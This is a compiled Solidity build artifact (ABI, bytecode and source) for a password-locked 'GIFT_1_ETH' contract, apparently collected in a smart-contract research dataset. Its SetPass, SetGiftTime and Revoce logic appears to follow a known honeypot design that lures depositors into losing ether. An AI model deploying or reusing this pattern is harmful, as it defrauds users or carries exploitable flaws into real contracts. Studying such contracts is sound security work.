{
  "contractName": "GIFT_1_ETH",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "hashPass",
      "outputs": [
        {
          "name": "",
          "type": "bytes32"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "pass",
          "type": "bytes"
        }
      ],
      "name": "GetHash",
      "outputs": [
        {
          "name": "",
          "type": "bytes32"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "hash",
          "type": "bytes32"
        }
      ],
      "name": "SetPass",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "date",
          "type": "uint256"
        }
      ],
      "name": "SetGiftTime",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "pass",
          "type": "bytes"
        }
      ],
      "name": "GetGift",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "Revoce",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "hash",
          "type": "bytes32"
        }
      ],
      "name": "PassHasBeenSet",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040526000600160006101000a81548160ff02191690831515021790555034801561002b57600080fd5b506105988061003b6000396000f300608060405260043610610083576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680630a6fbb0514610085578063181ffc5f146100a957806331fd725a146100d757806387f2448414610108578063b456ecc51461013b578063cd8b02c8146101c0578063dac47a71146101ca575b005b6100a760048036038101908080356000191690602001909291905050506101f7565b005b6100d560048036038101908080359060200190820180359060200191909192939192939050505061028a565b005b3480156100e357600080fd5b50610106600480360381019080803560001916906020019092919050505061032b565b005b34801561011457600080fd5b5061011d6103b3565b60405180826000191660001916815260200191505060405180910390f35b34801561014757600080fd5b506101a2600480360381019080803590602001908201803590602001908080601f01602080910402602001604051908101604052809392919081815260200183838082843782019150505050505091929192905050506103b9565b60405180826000191660001916815260200191505060405180910390f35b6101c8610425565b005b3480156101d657600080fd5b506101f56004803603810190808035906020019092919050505061050c565b005b600160009054906101000a900460ff1615801561021b5750670de0b6b3a764000034115b8061022f5750600060010260005460001916145b15610287578060008160001916905550336001806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550426002819055505b50565b6002544211151561029a57600080fd5b818160405180838380828437820191505092505050604051809103902060001916600054600019161415610327573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610325573d6000803e3d6000fd5b505b5050565b6001809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161480156103905750600054600019168160001916145b156103b05760018060006101000a81548160ff0219169083151502179055505b50565b60005481565b6000816040518082805190602001908083835b6020831015156103f157805182526020820191506020810190506020830392506103cc565b6001836020036101000a03801982511681845116808217855250505050505090500191505060405180910390209050919050565b6002544211151561043557600080fd5b6001809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141561050a576001809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610508573d6000803e3d6000fd5b505b565b6001809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141561056957806002819055505b505600a165627a7a723058201868d1125eb91ff5cff4ecae52743b3e1c2d556d492c86c52b2caa5de6a742f90029",
  "source": "\n\ncontract GIFT_1_ETH\n{\n    bytes32 public hashPass;\n    \n    bool closed = false;\n    \n    address sender;\n \n    uint unlockTime;\n \n    function() public payable{}\n    \n    function GetHash(bytes pass) public constant returns (bytes32) {return keccak256(pass);}\n    \n    function SetPass(bytes32 hash)\n    public\n    payable\n    {\n        if( (!closed&&(msg.value > 1 ether)) || hashPass==0x0 )\n        {\n            hashPass = hash;\n            sender = msg.sender;\n            unlockTime = now;\n        }\n    }\n    \n    function SetGiftTime(uint date)\n    public\n    {\n        if(msg.sender==sender)\n        {\n            unlockTime = date;\n        }\n    }\n    \n    function GetGift(bytes pass)\n    external\n    payable\n    canOpen\n    {\n        if(hashPass == keccak256(pass))\n        {\n            msg.sender.transfer(this.balance);\n        }\n    }\n    \n    function Revoce()\n    public\n    payable\n    canOpen\n    {\n        if(msg.sender==sender)\n        {\n            sender.transfer(this.balance);\n        }\n    }\n    \n    function PassHasBeenSet(bytes32 hash)\n    public\n    {\n        if(msg.sender==sender&&hash==hashPass)\n        {\n           closed=true;\n        }\n    }\n    \n    modifier canOpen\n    {\n        require(now>unlockTime);\n        _;\n    }\n    \n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0x34bc4f174c027a68f94a7ea6a3b4930e0211b19d/contracts/0x34bc4f174c027a68f94a7ea6a3b4930e0211b19d.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T03:51:47.954Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}